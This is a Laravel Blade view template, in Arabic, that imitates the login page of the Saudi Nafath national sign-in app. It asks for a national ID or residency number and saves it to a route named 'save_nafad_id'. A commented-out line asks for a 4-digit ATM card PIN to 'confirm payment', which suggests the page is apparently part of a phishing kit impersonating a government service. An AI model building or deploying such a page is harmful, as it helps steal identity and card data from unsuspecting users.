@extends('layouts.main')
@section('styles')
    <style>
      #phone{
        border:var(--bs-border-width) solid #b7bfc7
      }
      #phone:focus{
        box-shadow: none;
        border: 1px solid #13998e;
      }
    </style>
@endsection
@section('content')
<section class="padding-start container mb-5">
  <div class="row justify-content-center shadow">
    <div class="col-12 col-lg-7  shadow rounded-bottom">
      <div class="row">
        <div class="col-12  mt-5 mb-4">
          <div class="card">
            <h3 style="color:#13998E !important" class="text-center m-4"> الدخول على النظام</h3>
            <div class="card-header text-center" style="background-color:#13998E;color:white">
              تطبيق نفاذ
            </div>
          </div>
          <div class="card-body row">

            <form class="col-12 col-md-6 mt-5 mb-4" method="post" action="{{route('save_nafad_id')}}">
              @csrf
              <div class="col-12 mt-3 ">
                {{-- <h3 style="color: black">إثبات رقم الهاتف</h3> --}}
                {{-- <p style="color: black; margin-top: 10px">الرجاء إدخال رقم البطاقة السري للصراف الاًلي (ATM) المكون
                  من 4 خانات للتأك من عملية الدفع</p> --}}

              </div>
              <div class="col-12">
                <div class="mb-3">
                  <label for="phone" class="form-label" style="    color: #7c7a7a !important;
                    font-size: 14px;
                    font-weight: normal;">رقم بطاقة الأحوال/الاقامة</label>
                  <input type="tel" onkeypress="return onlyNumberKey(event)" maxlength="10" class="form-control cd"
                    id="phone" name="phone" placeholder="" required >
                </div>
              </div>
              <div class="col-12 mt-5">
                <button style="font-size: 14px;
                    width: 100%;
                    background-color: #13998E;
                    color: white;
                    display: flex;
                    justify-content: center;
                }" type="submit" class="btn btn-lg form-control-lg">
                  <svg width="23px" height="21px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path d="M18 20.75H15C14.8011 20.75 14.6103 20.671 14.4697 20.5303C14.329 20.3897 14.25 20.1989 14.25 20C14.25 19.8011 14.329 19.6103 14.4697 19.4696C14.6103 19.329 14.8011 19.25 15 19.25H18C18.2969 19.2758 18.5924 19.1863 18.8251 19.0001C19.0579 18.814 19.21 18.5453 19.25 18.25V5.77997C19.21 5.48462 19.0579 5.21599 18.8251 5.0298C18.5924 4.84362 18.2969 4.75415 18 4.77997H15C14.8011 4.77997 14.6103 4.70096 14.4697 4.5603C14.329 4.41965 14.25 4.22889 14.25 4.02997C14.25 3.83106 14.329 3.6403 14.4697 3.49964C14.6103 3.35899 14.8011 3.27997 15 3.27997H18C18.3468 3.26522 18.693 3.31899 19.019 3.43821C19.3449 3.55742 19.6442 3.73974 19.8996 3.97473C20.155 4.20972 20.3616 4.49277 20.5075 4.80768C20.6535 5.12259 20.7359 5.46319 20.75 5.80997V18.22C20.7359 18.5668 20.6535 18.9074 20.5075 19.2223C20.3616 19.5372 20.155 19.8202 19.8996 20.0552C19.6442 20.2902 19.3449 20.4725 19.019 20.5917C18.693 20.711 18.3468 20.7647 18 20.75Z" fill="#ffffff"></path> <path d="M11 16.75C10.9015 16.7504 10.8038 16.7312 10.7128 16.6934C10.6218 16.6557 10.5393 16.6001 10.47 16.53C10.3296 16.3893 10.2507 16.1987 10.2507 16C10.2507 15.8012 10.3296 15.6106 10.47 15.47L13.94 12L10.47 8.52997C10.3375 8.38779 10.2654 8.19975 10.2688 8.00545C10.2723 7.81115 10.351 7.62576 10.4884 7.48835C10.6258 7.35093 10.8112 7.27222 11.0055 7.26879C11.1998 7.26537 11.3878 7.33749 11.53 7.46997L15.53 11.47C15.6705 11.6106 15.7494 11.8012 15.7494 12C15.7494 12.1987 15.6705 12.3893 15.53 12.53L11.53 16.53C11.4608 16.6001 11.3782 16.6557 11.2872 16.6934C11.1962 16.7312 11.0986 16.7504 11 16.75Z" fill="#ffffff"></path> <path d="M15 12.75H4C3.80109 12.75 3.61032 12.671 3.46967 12.5303C3.32902 12.3897 3.25 12.1989 3.25 12C3.25 11.8011 3.32902 11.6103 3.46967 11.4697C3.61032 11.329 3.80109 11.25 4 11.25H15C15.1989 11.25 15.3897 11.329 15.5303 11.4697C15.671 11.6103 15.75 11.8011 15.75 12C15.75 12.1989 15.671 12.3897 15.5303 12.5303C15.3897 12.671 15.1989 12.75 15 12.75Z" fill="#ffffff"></path> </g></svg>
                  تسجيل الدخول
                </button>
              </div>
              <div class="col-12 mt-5 text-center">
                <span class="m-auto d-block mb-2" style="color: #555555">لتحميل تطبيق نفاذ</span>
                <div class="d-flex justify-content-between ">
                  <a href="https://apps.apple.com/sa/app/%D9%86%D9%81%D8%A7%D8%B0-nafath/id1598909871" target="_blank">
                    <img src="{{asset('theme/images/apple_store.png')}}" style="    height: 27px;"  alt="apple store logo">
                  </a>
                  <a href="https://play.google.com/store/apps/details?id=sa.gov.nic.myid" target="_blank">
                    <img src="{{asset('theme/images/google_play.png')}}" style="    height: 27px;"  alt="google play">
                  </a>
                  <a href="https://appgallery.huawei.com/app/C106870695" target="_blank">
                    <img src="{{asset('theme/images/huawei_store.jpg')}}" style="    height: 27px;"  alt="google play">
                  </a>
                </div>
              </div>
          </form>
          <div class="col-12 col-md-6 mt-5 mb-4 text-center">
            <img src="{{asset('theme/images/secure.svg')}}"  alt="apple store logo" style="    height: 155px;
            margin: auto;">
            <p style="color: #555555!important;
            font-size: 13px;">
              الرجاء إدخال رقم بطاقة الأحوال/الاقامة، ثم اضغط دخول.
            </p>
          </div>

        </div>

      </div>
    </div>
  </div>
  </div>
</section>

@endsection
@section('scripts')

@endsection